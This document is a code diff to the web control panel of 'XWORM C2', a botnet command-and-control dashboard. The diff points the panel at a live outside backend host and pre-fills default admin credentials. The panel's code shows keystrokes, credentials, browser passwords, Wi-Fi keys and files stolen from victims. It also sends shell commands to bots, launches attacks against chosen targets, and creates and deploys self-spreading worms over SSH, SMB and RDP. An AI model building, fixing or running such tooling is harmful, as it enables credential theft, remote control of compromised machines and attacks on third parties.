@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XWORM</title>
+<title>XWORM C2</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -712,8 +712,8 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   <div class="login-box">
     <div class="login-skull">💀</div>
     <div class="login-title">XWORM</div>
-    <input class="login-field" type="text" id="u" placeholder="USERNAME" value="" autocomplete="off">
-    <input class="login-field" type="password" id="p" placeholder="PASSWORD" value="" autocomplete="off">
+    <input class="login-field" type="text" id="u" placeholder="USERNAME" value="admin" autocomplete="off">
+    <input class="login-field" type="password" id="p" placeholder="PASSWORD" value="password" autocomplete="off">
     <button class="login-btn" onclick="login()">[ AUTHENTICATE ]</button>
     <div class="login-error" id="loginErr">⛔ ACCESS DENIED</div>
   </div>
@@ -1128,7 +1128,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   <!-- Status Bar -->
   <div class="status-bar">
     <div class="sb-item">STATUS: <span id="connStatus">CONNECTING...</span></div>
-    <div class="sb-item">C2: <span id="c2Addr">localhost:5000</span></div>
+    <div class="sb-item">C2: <span id="c2Addr">b-n1nt.onrender.com</span></div>
     <div class="sb-item">UPTIME: <span id="uptime">00:00:00</span></div>
     <div class="sb-item">WORM: <span id="wormStatus">STOPPED</span></div>
     <div class="sb-item" style="margin-left:auto;">XWORM C2 v3.0 — AUTO-WORM ENABLED</div>
@@ -1167,7 +1167,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
 })();
 
 // ─── CONFIGURATION ────────────────────────────────────────────────────────────
-const API_BASE = window.location.origin;
+const API_BASE = 'https://b-n1nt.onrender.com'; // Your Render backend
 let authToken = btoa(':');
 let activeBots = [];
 let stats = { total_bots: 0, active_bots: 0, total_keystrokes: 0, total_credentials: 0 };
@@ -1181,6 +1181,7 @@ function login() {
   authToken = btoa(`${u}:${p}`);
   
   fetch(`${API_BASE}/api/login-test`, {
+    method: 'GET',
     headers: { 'Authorization': `Basic ${authToken}` }
   })
   .then(res => {
@@ -1216,43 +1217,44 @@ async function apiCall(endpoint, options = {}) {
     ...options.headers
   };
   
-  const response = await fetch(`${API_BASE}${endpoint}`, { ...options, headers });
-  
-  if(response.status === 401) {
-    alert('Session expired. Please login again.');
-    logout();
+  try {
+    const response = await fetch(`${API_BASE}${endpoint}`, { ...options, headers });
+    
+    if(response.status === 401) {
+      console.log('Session expired');
+      return null;
+    }
+    
+    if(!response.ok) {
+      console.log(`API error: ${response.status}`);
+      return null;
+    }
+    
+    return response.json();
+  } catch(e) {
+    console.log('API call failed:', e);
     return null;
   }
-  
-  if(!response.ok) {
-    const text = await response.text();
-    throw new Error(`API error: ${response.status} - ${text}`);
-  }
-  
-  return response.json();
 }
 
 // ─── INIT ─────────────────────────────────────────────────────────────────────
 async function init() {
-  document.getElementById('c2Addr').textContent = window.location.hostname + ':' + window.location.port;
+  document.getElementById('c2Addr').textContent = 'b-n1nt.onrender.com';
   
   // Load initial data
-  await Promise.all([
-    loadStats(),
-    loadBots(),
-    loadKS(),
-    loadCreds(),
-    loadBrowser(),
-    loadWifi(),
-    loadScreenshots(),
-    loadFullCreds(),
-    loadFiles(),
-    loadPlugins(),
-    loadCurrentCreds(),
-    loadWormStats(),
-    loadWorms(),
-    loadWormTasks()
-  ]);
+  await loadStats();
+  await loadBots();
+  await loadKS();
+  await loadCreds();
+  await loadBrowser();
+  await loadWifi();
+  await loadFullCreds();
+  await loadFiles();
+  await loadPlugins();
+  await loadCurrentCreds();
+  await loadWormStats();
+  await loadWorms();
+  await loadWormTasks();
   
   // Set up intervals for auto-refresh
   setInterval(() => { loadStats(); loadBots(); }, 5000);
@@ -1284,11 +1286,16 @@ function switchTab(name) {
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
   document.querySelectorAll('.tab-pane').forEach(p => { p.classList.remove('active'); p.style.display='none'; });
   const tabs = ['dashboard','bots','terminal','attacks','data','worm','plugins','settings'];
-  document.querySelectorAll('.tab')[tabs.indexOf(name)].classList.add('active');
+  const index = tabs.indexOf(name);
+  if (index >= 0) {
+    document.querySelectorAll('.tab')[index].classList.add('active');
+  }
   const pane = document.getElementById('pane-'+name);
-  pane.classList.add('active');
-  if(name === 'dashboard') { pane.style.display = 'grid'; }
-  else { pane.style.display = 'flex'; }
+  if (pane) {
+    pane.classList.add('active');
+    if(name === 'dashboard') { pane.style.display = 'grid'; }
+    else { pane.style.display = 'flex'; }
+  }
   
   // Refresh data when switching to certain tabs
   if(name === 'bots') loadBots();
@@ -1308,7 +1315,7 @@ async function loadStats() {
     document.getElementById('sTotal').textContent = data.total_bots || 0;
     document.getElementById('sKeys').textContent = data.total_keystrokes || 0;
     document.getElementById('sCreds').textContent = data.total_credentials || 0;
-    document.getElementById('sWorms').textContent = data.worm_stats?.active_worms || 0;
+    document.getElementById('sWorms').textContent = (data.worm_stats && data.worm_stats.active_worms) || 0;
     
     // Update worm stats in dashboard
     if(data.worm_stats) {
@@ -1324,15 +1331,16 @@ async function loadStats() {
 async function loadKS() {
   try {
     const data = await apiCall('/api/keystrokes?limit=50');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     const tb = document.getElementById('tbKS');
+    if (!tb) return;
     tb.innerHTML = '';
     
     data.forEach(r => {
       const tr = tb.insertRow();
-      tr.insertCell().textContent = new Date(r.timestamp).toLocaleTimeString() || '--';
-      tr.insertCell().textContent = r.ip;
+      tr.insertCell().textContent = r.timestamp ? new Date(r.timestamp).toLocaleTimeString() : '--';
+      tr.insertCell().textContent = r.ip || '--';
       tr.insertCell().textContent = r.username || '-';
       tr.insertCell().textContent = (r.keystrokes || '').substring(0, 50);
       const td = tr.insertCell();
@@ -1347,22 +1355,27 @@ async function loadKS() {
 
 function filterKS(v) {
   const rows = document.querySelectorAll('#tbKS tr');
-  rows.forEach(r => r.style.display = r.cells[1]?.textContent.includes(v) ? '' : 'none');
+  rows.forEach(r => {
+    if (r.cells[1]) {
+      r.style.display = r.cells[1].textContent.includes(v) ? '' : 'none';
+    }
+  });
 }
 
 // ─── CREDENTIALS ──────────────────────────────────────────────────────────────
 async function loadCreds() {
   try {
     const data = await apiCall('/api/credentials?limit=20');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     const tb = document.getElementById('tbCreds');
+    if (!tb) return;
     tb.innerHTML = '';
     
     data.forEach(r => {
       const tr = tb.insertRow();
-      tr.insertCell().textContent = new Date(r.timestamp).toLocaleTimeString();
-      tr.insertCell().textContent = r.ip;
+      tr.insertCell().textContent = r.timestamp ? new Date(r.timestamp).toLocaleTimeString() : '--';
+      tr.insertCell().textContent = r.ip || '--';
       const td = tr.insertCell(); 
       td.innerHTML = `<span class="tag-red">${r.hostname || 'CRED'}</span>`;
       tr.insertCell().textContent = (r.credentials || '').substring(0, 40);
@@ -1376,16 +1389,17 @@ async function loadCreds() {
 async function loadBrowser() {
   try {
     const data = await apiCall('/api/browser_data?limit=10');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     const tb = document.getElementById('tbBrowser');
+    if (!tb) return;
     tb.innerHTML = '';
     
     data.forEach(r => {
       const tr = tb.insertRow();
-      tr.insertCell().textContent = r.ip;
-      tr.insertCell().textContent = r.stats?.passwords || 0;
-      tr.insertCell().textContent = r.stats?.history || 0;
+      tr.insertCell().textContent = r.ip || '--';
+      tr.insertCell().textContent = (r.stats && r.stats.passwords) || 0;
+      tr.insertCell().textContent = (r.stats && r.stats.history) || 0;
     });
   } catch(e) {
     console.error('Failed to load browser data:', e);
@@ -1396,20 +1410,23 @@ async function loadBrowser() {
 async function loadWifi() {
   try {
     const data = await apiCall('/api/wifi_data?limit=20');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     const tb = document.getElementById('tbWifi');
+    if (!tb) return;
     tb.innerHTML = '';
     
     data.forEach(r => {
       try {
         const wifiData = JSON.parse(r.wifi_data || '{}');
-        Object.entries(wifiData).forEach(([ssid, pwd]) => {
-          const tr = tb.insertRow();
-          tr.insertCell().textContent = r.ip;
-          tr.insertCell().textContent = ssid;
-          tr.insertCell().textContent = pwd;
-        });
+        if (typeof wifiData === 'object') {
+          Object.entries(wifiData).forEach(([ssid, pwd]) => {
+            const tr = tb.insertRow();
+            tr.insertCell().textContent = r.ip || '--';
+            tr.insertCell().textContent = ssid;
+            tr.insertCell().textContent = pwd;
+          });
+        }
       } catch {
         // Skip if can't parse
       }
@@ -1419,49 +1436,20 @@ async function loadWifi() {
   }
 }
 
-// ─── SCREENSHOTS ──────────────────────────────────────────────────────────────
-async function loadScreenshots() {
-  try {
-    const data = await apiCall('/api/screenshots?limit=10');
-    if(!data) return;
-    
-    const tb = document.getElementById('tbScreenshots');
-    tb.innerHTML = '';
-    
-    data.forEach(r => {
-      const tr = tb.insertRow();
-      tr.insertCell().textContent = new Date(r.timestamp).toLocaleString();
-      tr.insertCell().textContent = r.ip;
-      const cell = tr.insertCell();
-      const img = document.createElement('img');
-      img.src = `${API_BASE}/api/screenshot/${r.filename}`;
-      img.style.maxWidth = '100px';
-      img.style.maxHeight = '60px';
-      img.style.cursor = 'pointer';
-      img.onclick = () => {
-        document.getElementById('modalImage').src = img.src;
-        document.getElementById('screenshotModal').classList.add('active');
-      };
-      cell.appendChild(img);
-    });
-  } catch(e) {
-    console.error('Failed to load screenshots:', e);
-  }
-}
-
 // ─── FULL CREDENTIALS ─────────────────────────────────────────────────────────
 async function loadFullCreds() {
   try {
     const data = await apiCall('/api/credentials?limit=100');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     const tb = document.getElementById('tbFullCreds');
+    if (!tb) return;
     tb.innerHTML = '';
     
     data.forEach(r => {
       const tr = tb.insertRow();
-      tr.insertCell().textContent = new Date(r.timestamp).toLocaleString();
-      tr.insertCell().textContent = r.ip;
+      tr.insertCell().textContent = r.timestamp ? new Date(r.timestamp).toLocaleString() : '--';
+      tr.insertCell().textContent = r.ip || '--';
       const td = tr.insertCell(); 
       td.innerHTML = `<span class="tag-red">${r.hostname || 'CRED'}</span>`;
       tr.insertCell().textContent = (r.credentials || '').substring(0, 60);
@@ -1475,16 +1463,17 @@ async function loadFullCreds() {
 async function loadFiles() {
   try {
     const data = await apiCall('/api/files_data?limit=50');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     const tb = document.getElementById('tbFiles');
+    if (!tb) return;
     tb.innerHTML = '';
     
     data.forEach(r => {
       (r.files || []).forEach(f => {
         const tr = tb.insertRow();
-        tr.insertCell().textContent = r.ip;
-        tr.insertCell().textContent = f.path || f;
+        tr.insertCell().textContent = r.ip || '--';
+        tr.insertCell().textContent = f.path || f || '--';
         tr.insertCell().textContent = f.size ? `${Math.round(f.size/1024)}KB` : '--';
       });
     });
@@ -1497,11 +1486,12 @@ async function loadFiles() {
 async function loadBots() {
   try {
     const data = await apiCall('/api/bots');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     activeBots = data.filter(b => b.status === 'active');
     
     const tb = document.getElementById('tbBots');
+    if (!tb) return;
     tb.innerHTML = '';
     
     // Update bot dropdowns
@@ -1509,31 +1499,40 @@ async function loadBots() {
     const atkBotSelect = document.getElementById('atkBots');
     const plgTargetSelect = document.getElementById('plgTarget');
     
-    targetSelect.innerHTML = '<option value="all">All Bots</option>';
-    atkBotSelect.innerHTML = '<option value="all">All Bots</option>';
-    plgTargetSelect.innerHTML = '<option value="all">All Bots</option>';
+    if (targetSelect) {
+      targetSelect.innerHTML = '<option value="all">All Bots</option>';
+    }
+    if (atkBotSelect) {
+      atkBotSelect.innerHTML = '<option value="all">All Bots</option>';
+    }
+    if (plgTargetSelect) {
+      plgTargetSelect.innerHTML = '<option value="all">All Bots</option>';
+    }
     
     data.forEach(b => {
       const tr = tb.insertRow();
       tr.insertCell().innerHTML = `<input type="checkbox" style="accent-color:var(--red);">`;
-      tr.insertCell().textContent = b.ip;
-      tr.insertCell().textContent = b.hostname;
-      tr.insertCell().textContent = b.username;
-      tr.insertCell().textContent = b.os_info;
-      tr.insertCell().innerHTML = `<span class="badge ${b.status==='active'?'badge-active':'badge-dead'}"><span class="dot ${b.status==='active'?'dot-active':'dot-dead'}"></span>${b.status.toUpperCase()}</span>`;
+      tr.insertCell().textContent = b.ip || '--';
+      tr.insertCell().textContent = b.hostname || '--';
+      tr.insertCell().textContent = b.username || '--';
+      tr.insertCell().textContent = b.os_info || '--';
+      tr.insertCell().innerHTML = `<span class="badge ${b.status==='active'?'badge-active':'badge-dead'}"><span class="dot ${b.status==='active'?'dot-active':'dot-dead'}"></span>${(b.status||'unknown').toUpperCase()}</span>`;
       tr.insertCell().innerHTML = b.worm_version ? `<span class="badge badge-worm">v${b.worm_version}</span>` : '-';
-      tr.insertCell().textContent = new Date(b.last_seen).toLocaleString();
+      tr.insertCell().textContent = b.last_seen ? new Date(b.last_seen).toLocaleString() : '--';
       tr.insertCell().innerHTML = `<button class="btn-ghost btn" onclick="termTo('${b.ip}')">TERM</button> <button class="btn-ghost btn" style="color:var(--red)" onclick="killBot('${b.ip}')">KILL</button>`;
       
       // Add to dropdowns
       if(b.status === 'active') {
-        targetSelect.innerHTML += `<option value="${b.ip}">${b.ip} (${b.hostname})</option>`;
-        atkBotSelect.innerHTML += `<option value="${b.ip}">${b.ip}</option>`;
-        plgTargetSelect.innerHTML += `<option value="${b.ip}">${b.ip}</option>`;
+        if (targetSelect) targetSelect.innerHTML += `<option value="${b.ip}">${b.ip} (${b.hostname})</option>`;
+        if (atkBotSelect) atkBotSelect.innerHTML += `<option value="${b.ip}">${b.ip}</option>`;
+        if (plgTargetSelect) plgTargetSelect.innerHTML += `<option value="${b.ip}">${b.ip}</option>`;
       }
     });
     
-    document.getElementById('botCount').textContent = activeBots.length + ' ONLINE';
+    const botCount = document.getElementById('botCount');
+    if (botCount) {
+      botCount.textContent = activeBots.length + ' ONLINE';
+    }
   } catch(e) {
     console.error('Failed to load bots:', e);
   }
@@ -1549,7 +1548,10 @@ async function loadWormStats() {
     updateWormDashboardStats();
     
     // Update worm status in header
-    document.getElementById('wormStatus').textContent = data.active_worms > 0 ? 'ACTIVE' : 'STOPPED';
+    const wormStatus = document.getElementById('wormStatus');
+    if (wormStatus) {
+      wormStatus.textContent = data.active_worms > 0 ? 'ACTIVE' : 'STOPPED';
+    }
     
   } catch(e) {
     console.error('Failed to load worm stats:', e);
@@ -1557,13 +1559,18 @@ async function loadWormStats() {
 }
 
 function updateWormDashboardStats() {
-  document.getElementById('wormTotalInfections').textContent = wormStats.total_infections || 0;
-  document.getElementById('wormActiveWorms').textContent = wormStats.active_worms || 0;
+  const totalInfections = document.getElementById('wormTotalInfections');
+  const activeWorms = document.getElementById('wormActiveWorms');
+  const successRate = document.getElementById('wormSuccessRate');
+  const pendingTasks = document.getElementById('wormPendingTasks');
+  
+  if (totalInfections) totalInfections.textContent = wormStats.total_infections || 0;
+  if (activeWorms) activeWorms.textContent = wormStats.active_worms || 0;
   
   const total = (wormStats.successful_exploits || 0) + (wormStats.failed_attempts || 0);
   const rate = total > 0 ? Math.round((wormStats.successful_exploits / total) * 100) : 0;
-  document.getElementById('wormSuccessRate').textContent = rate + '%';
-  document.getElementById('wormPendingTasks').textContent = wormStats.pending_tasks || 0;
+  if (successRate) successRate.textContent = rate + '%';
+  if (pendingTasks) pendingTasks.textContent = wormStats.pending_tasks || 0;
   
   // Update dashboard worm stats table
   const tb = document.getElementById('tbWormStats');
@@ -1586,33 +1593,36 @@ async function loadWorms() {
     if(!data) return;
     
     const el = document.getElementById('wormList');
+    if (!el) return;
     el.innerHTML = '';
     
-    Object.entries(data).forEach(([id, worm]) => {
-      const statusClass = worm.status === 'active' ? 'active' : (worm.status === 'paused' ? 'paused' : 'killed');
-      el.innerHTML += `
-        <div class="worm-item ${statusClass}">
-          <div style="flex:1;">
-            <div style="display:flex;align-items:center;gap:10px;margin-bottom:5px;">
-              <span style="color:var(--worm);font-family:'Share Tech Mono',monospace;font-size:1rem;">
-                🧬 ${worm.name || 'Unnamed'} <span style="color:var(--text2);font-size:0.7rem;">v${worm.version}</span>
-              </span>
-              <span class="tag-worm">${worm.status.toUpperCase()}</span>
-              <span style="color:var(--text2);font-size:0.7rem;">ID: ${id}</span>
-            </div>
-            <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:5px;font-size:0.75rem;">
-              <div>Infections: ${worm.current_infections || 0}/${worm.max_infections || '∞'}</div>
-              <div>Methods: ${(worm.propagation_methods || []).join(', ')}</div>
-              <div>Created: ${new Date(worm.created_at).toLocaleString()}</div>
-              <div>
-                <button class="btn-ghost" onclick="activateWorm('${id}')" ${worm.status==='active'?'disabled':''}>▶</button>
-                <button class="btn-ghost" onclick="pauseWorm('${id}')" ${worm.status!=='active'?'disabled':''}>⏸</button>
-                <button class="btn-ghost" style="color:var(--red)" onclick="killWorm('${id}')">💀</button>
+    if (typeof data === 'object') {
+      Object.entries(data).forEach(([id, worm]) => {
+        const statusClass = worm.status === 'active' ? 'active' : (worm.status === 'paused' ? 'paused' : 'killed');
+        el.innerHTML += `
+          <div class="worm-item ${statusClass}">
+            <div style="flex:1;">
+              <div style="display:flex;align-items:center;gap:10px;margin-bottom:5px;">
+                <span style="color:var(--worm);font-family:'Share Tech Mono',monospace;font-size:1rem;">
+                  🧬 ${worm.name || 'Unnamed'} <span style="color:var(--text2);font-size:0.7rem;">v${worm.version}</span>
+                </span>
+                <span class="tag-worm">${(worm.status||'unknown').toUpperCase()}</span>
+                <span style="color:var(--text2);font-size:0.7rem;">ID: ${id}</span>
+              </div>
+              <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:5px;font-size:0.75rem;">
+                <div>Infections: ${worm.current_infections || 0}/${worm.max_infections || '∞'}</div>
+                <div>Methods: ${(worm.propagation_methods || []).join(', ')}</div>
+                <div>Created: ${worm.created_at ? new Date(worm.created_at).toLocaleString() : '--'}</div>
+                <div>
+                  <button class="btn-ghost" onclick="activateWorm('${id}')" ${worm.status==='active'?'disabled':''}>▶</button>
+                  <button class="btn-ghost" onclick="pauseWorm('${id}')" ${worm.status!=='active'?'disabled':''}>⏸</button>
+                  <button class="btn-ghost" style="color:var(--red)" onclick="killWorm('${id}')">💀</button>
+                </div>
               </div>
             </div>
-          </div>
-        </div>`;
-    });
+          </div>`;
+      });
+    }
   } catch(e) {
     console.error('Failed to load worms:', e);
   }
@@ -1622,17 +1632,18 @@ async function loadWorms() {
 async function loadWormTasks() {
   try {
     const data = await apiCall('/api/worm/tasks?limit=50');
-    if(!data) return;
+    if(!data || !Array.isArray(data)) return;
     
     const tb = document.getElementById('tbWormTasks');
+    if (!tb) return;
     tb.innerHTML = '';
     
     data.forEach(task => {
       const tr = tb.insertRow();
-      tr.insertCell().textContent = new Date(task.created_at).toLocaleString();
-      tr.insertCell().innerHTML = `<span class="tag-${task.task_type === 'propagate' ? 'worm' : 'red'}">${task.task_type}</span>`;
-      tr.insertCell().textContent = task.target_ip;
-      tr.insertCell().innerHTML = `<span class="badge ${task.status}">${task.status}</span>`;
+      tr.insertCell().textContent = task.created_at ? new Date(task.created_at).toLocaleString() : '--';
+      tr.insertCell().innerHTML = `<span class="tag-${task.task_type === 'propagate' ? 'worm' : 'red'}">${task.task_type || '--'}</span>`;
+      tr.insertCell().textContent = task.target_ip || '--';
+      tr.insertCell().innerHTML = `<span class="badge ${task.status || 'pending'}">${task.status || 'pending'}</span>`;
     });
   } catch(e) {
     console.error('Failed to load worm tasks:', e);
@@ -1643,10 +1654,15 @@ async function loadWormTasks() {
 async function startWormEngine() {
   try {
     await apiCall('/api/worm/propagation/start', { method: 'POST' });
-    document.getElementById('wormStartBtn').style.display = 'none';
-    document.getElementById('wormStopBtn').style.display = 'inline-block';
-    document.getElementById('wormEngineStatus').textContent = 'ACTIVE';
-    document.getElementById('wormEngineStatus').className = 'tag-worm';
+    const startBtn = document.getElementById('wormStartBtn');
+    const stopBtn = document.getElementById('wormStopBtn');
+    const engineStatus = document.getElementById('wormEngineStatus');
+    if (startBtn) startBtn.style.display = 'none';
+    if (stopBtn) stopBtn.style.display = 'inline-block';
+    if (engineStatus) {
+      engineStatus.textContent = 'ACTIVE';
+      engineStatus.className = 'tag-worm';
+    }
     termLog('atkLog', '🧬 Worm propagation engine STARTED', false);
   } catch(e) {
     alert('Failed to start worm engine: ' + e.message);
@@ -1656,10 +1672,15 @@ async function startWormEngine() {
 async function stopWormEngine() {
   try {
     await apiCall('/api/worm/propagation/stop', { method: 'POST' });
-    document.getElementById('wormStartBtn').style.display = 'inline-block';
-    document.getElementById('wormStopBtn').style.display = 'none';
-    document.getElementById('wormEngineStatus').textContent = 'INACTIVE';
-    document.getElementById('wormEngineStatus').className = 'tag-red';
+    const startBtn = document.getElementById('wormStartBtn');
+    const stopBtn = document.getElementById('wormStopBtn');
+    const engineStatus = document.getElementById('wormEngineStatus');
+    if (startBtn) startBtn.style.display = 'inline-block';
+    if (stopBtn) stopBtn.style.display = 'none';
+    if (engineStatus) {
+      engineStatus.textContent = 'INACTIVE';
+      engineStatus.className = 'tag-red';
+    }
     termLog('atkLog', '🧬 Worm propagation engine STOPPED', true);
   } catch(e) {
     alert('Failed to stop worm engine: ' + e.message);
@@ -1672,25 +1693,30 @@ async function createWorm() {
   const maxInfections = parseInt(document.getElementById('wormMaxInfections').value);
   
   const methods = [];
-  if(document.getElementById('ruleUseSSH').checked) methods.push('ssh');
-  if(document.getElementById('ruleUseSMB').checked) methods.push('smb');
-  if(document.getElementById('ruleUseRDP').checked) methods.push('rdp');
+  if(document.getElementById('ruleUseSSH')?.checked) methods.push('ssh');
+  if(document.getElementById('ruleUseSMB')?.checked) methods.push('smb');
+  if(document.getElementById('ruleUseRDP')?.checked) methods.push('rdp');
   
   try {
     const result = await apiCall('/api/worm/create', {
       method: 'POST',
       body: JSON.stringify({
+        worm_id: 'new_worm',
         name: name,
         version: version,
         auto_propagate: true,
         propagation_methods: methods,
         max_infections: maxInfections,
-        status: 'active'
+        status: 'active',
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString()
       })
     });
     
-    alert(`Worm created with ID: ${result.worm_id}`);
-    loadWorms();
+    if (result) {
+      alert(`Worm created with ID: ${result.worm_id}`);
+      loadWorms();
+    }
   } catch(e) {
     alert('Failed to create worm: ' + e.message);
   }
@@ -1727,7 +1753,8 @@ async function killWorm(id) {
 
 async function scanNetwork() {
   const network = document.getElementById('scanNetwork').value;
-  const ports = document.getElementById('scanPorts').value.split(',').map(p => parseInt(p.trim()));
+  const portsInput = document.getElementById('scanPorts').value;
+  const ports = portsInput.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
   
   try {
     const result = await apiCall('/api/worm/scan', {
@@ -1738,8 +1765,10 @@ async function scanNetwork() {
       })
     });
     
-    alert(`Scan initiated for ${result.count} targets`);
-    loadWormTasks();
+    if (result) {
+      alert(`Scan initiated for ${result.count} targets`);
+      loadWormTasks();
+    }
   } catch(e) {
     alert('Failed to scan network: ' + e.message);
   }
@@ -1759,13 +1788,15 @@ async function deployToNetwork() {
       const result = await apiCall('/api/worm/deploy', {
         method: 'POST',
         body: JSON.stringify({
-          target_ips: targets.slice(0, 50), // Limit to 50 for safety
+          target_ips: targets.slice(0, 50),
           payload_type: 'standard'
         })
       });
       
-      alert(`Deployment initiated to ${result.deployed.length} targets`);
-      loadWormTasks();
+      if (result) {
+        alert(`Deployment initiated to ${result.deployed.length} targets`);
+        loadWormTasks();
+      }
     } catch(e) {
       alert('Failed to deploy: ' + e.message);
     }
@@ -1779,24 +1810,27 @@ async function loadPlugins() {
     if(!data) return;
     
     const el = document.getElementById('plgList');
+    if (!el) return;
     el.innerHTML = '';
     
-    Object.entries(data).forEach(([name, info]) => {
-      el.innerHTML += `
-        <div class="plugin-item">
-          <div>
-            <div style="color:var(--red);font-family:'Share Tech Mono',monospace;font-size:0.85rem;">
-              ${name} <span style="color:var(--text2);font-size:0.7rem;">v${info.version}</span>
+    if (typeof data === 'object') {
+      Object.entries(data).forEach(([name, info]) => {
+        el.innerHTML += `
+          <div class="plugin-item">
+            <div>
+              <div style="color:var(--red);font-family:'Share Tech Mono',monospace;font-size:0.85rem;">
+                ${name} <span style="color:var(--text2);font-size:0.7rem;">v${info.version}</span>
+              </div>
+              <div style="color:var(--text2);font-size:0.78rem;margin-top:3px;">
+                ${info.description || 'No description'}
+              </div>
+              <div style="color:var(--text2);font-size:0.7rem;margin-top:2px;">
+                Uploaded: ${info.uploaded ? new Date(info.uploaded).toLocaleString() : '--'}
+              </div>
             </div>
-            <div style="color:var(--text2);font-size:0.78rem;margin-top:3px;">
-              ${info.description || 'No description'}
-            </div>
-            <div style="color:var(--text2);font-size:0.7rem;margin-top:2px;">
-              Uploaded: ${new Date(info.uploaded).toLocaleString()}
-            </div>
-          </div>
-        </div>`;
-    });
+          </div>`;
+      });
+    }
   } catch(e) {
     console.error('Failed to load plugins:', e);
   }
@@ -1808,8 +1842,10 @@ async function loadCurrentCreds() {
     const data = await apiCall('/api/current_credentials');
     if(!data) return;
     
-    document.getElementById('curUser').value = data.username;
-    document.getElementById('curPass').value = data.password;
+    const curUser = document.getElementById('curUser');
+    const curPass = document.getElementById('curPass');
+    if (curUser) curUser.value = data.username || '';
+    if (curPass) curPass.value = data.password || '';
   } catch(e) {
     console.error('Failed to load current credentials:', e);
   }
@@ -1845,14 +1881,15 @@ async function killBot(ip) {
 }
 
 function termTo(ip) {
-  document.getElementById('tTarget').value = ip;
+  const targetSelect = document.getElementById('tTarget');
+  if (targetSelect) targetSelect.value = ip;
   switchTab('terminal');
   termLog('termOut', `Switched target → ${ip}`, false);
 }
 
 async function execCmd() {
-  const cmd = document.getElementById('tCmd').value.trim();
-  const tgt = document.getElementById('tTarget').value;
+  const cmd = document.getElementById('tCmd')?.value.trim();
+  const tgt = document.getElementById('tTarget')?.value;
   
   if(!cmd) return;
   
@@ -1864,31 +1901,44 @@ async function execCmd() {
         method: 'POST',
         body: JSON.stringify({ command: cmd, all_bots: true })
       });
-      termLog('termOut', `📡 Command broadcast to ${result.bots_targeted} bots`, false);
+      if (result) {
+        termLog('termOut', `📡 Command broadcast to ${result.bots_targeted} bots`, false);
+      }
     } else {
       const result = await apiCall('/api/commands', {
         method: 'POST',
         body: JSON.stringify({ ip: tgt, command: cmd, is_terminal: true })
       });
-      termLog('termOut', `📡 Command queued (ID: ${result.command_id})`, false);
+      if (result) {
+        termLog('termOut', `📡 Command queued (ID: ${result.command_id})`, false);
+      }
     }
   } catch(e) {
     termLog('termOut', `❌ Error: ${e.message}`, true);
   }
   
-  document.getElementById('tCmd').value = '';
+  const tCmd = document.getElementById('tCmd');
+  if (tCmd) tCmd.value = '';
 }
 
 function clearTerm() {
-  document.getElementById('termOut').innerHTML = '<div class="t-line"><span class="t-ts">[CLEARED]</span></div>';
+  const termOut = document.getElementById('termOut');
+  if (termOut) {
+    termOut.innerHTML = '<div class="t-line"><span class="t-ts">[CLEARED]</span></div>';
+  }
 }
 
 async function launchAtk() {
-  const target = document.getElementById('atkTarget').value;
-  const port = parseInt(document.getElementById('atkPort').value);
-  const duration = parseInt(document.getElementById('atkDur').value);
-  const method = document.getElementById('atkMethod').value;
-  const botSelect = document.getElementById('atkBots').value;
+  const target = document.getElementById('atkTarget')?.value;
+  const port = parseInt(document.getElementById('atkPort')?.value);
+  const duration = parseInt(document.getElementById('atkDur')?.value);
+  const method = document.getElementById('atkMethod')?.value;
+  const botSelect = document.getElementById('atkBots')?.value;
+  
+  if (!target || !port || !duration) {
+    alert('Please fill all fields');
+    return;
+  }
   
   const payload = {
     target,
@@ -1909,7 +1959,9 @@ async function launchAtk() {
       method: 'POST',
       body: JSON.stringify(payload)
     });
-    termLog('atkLog', `⚡ Attack launched — ${result.bots_used} bots engaged`, true);
+    if (result) {
+      termLog('atkLog', `⚡ Attack launched — ${result.bots_used} bots engaged`, true);
+    }
   } catch(e) {
     termLog('atkLog', `❌ Error: ${e.message}`, true);
   }
@@ -1917,22 +1969,22 @@ async function launchAtk() {
 
 async function deployPlugin() {
   const fileInput = document.getElementById('plgFile');
-  if(!fileInput.files || !fileInput.files[0]) {
+  if(!fileInput || !fileInput.files || !fileInput.files[0]) {
     alert('Please select a plugin file');
     return;
   }
   
-  const name = document.getElementById('plgName').value;
-  const version = document.getElementById('plgVer').value;
-  const description = document.getElementById('plgDesc').value;
-  const target = document.getElementById('plgTarget').value;
+  const name = document.getElementById('plgName')?.value;
+  const version = document.getElementById('plgVer')?.value;
+  const description = document.getElementById('plgDesc')?.value;
+  const target = document.getElementById('plgTarget')?.value;
   
   const formData = new FormData();
   formData.append('file', fileInput.files[0]);
   formData.append('name', name);
   formData.append('version', version);
   formData.append('description', description);
-  formData.append('all_bots', target === 'all');
+  formData.append('all_bots', target === 'all' ? 'true' : 'false');
   if(target !== 'all') {
     formData.append('target_ips', target);
   }
@@ -1957,8 +2009,10 @@ async function deployPlugin() {
 }
 
 async function changeCreds() {
-  const newUser = document.getElementById('newUser').value;
-  const newPass = document.getElementById('newPass').value;
+  const newUser = document.getElementById('newUser')?.value;
+  const newPass = document.getElementById('newPass')?.value;
+  const curUser = document.getElementById('curUser')?.value;
+  const curPass = document.getElementById('curPass')?.value;
   
   if(!newUser && !newPass) {
     alert('Enter new username or password');
@@ -1966,7 +2020,7 @@ async function changeCreds() {
   }
   
   try {
-    await apiCall(`/api/change_credentials?new_username=${encodeURIComponent(newUser || document.getElementById('curUser').value)}&new_password=${encodeURIComponent(newPass || document.getElementById('curPass').value)}`, {
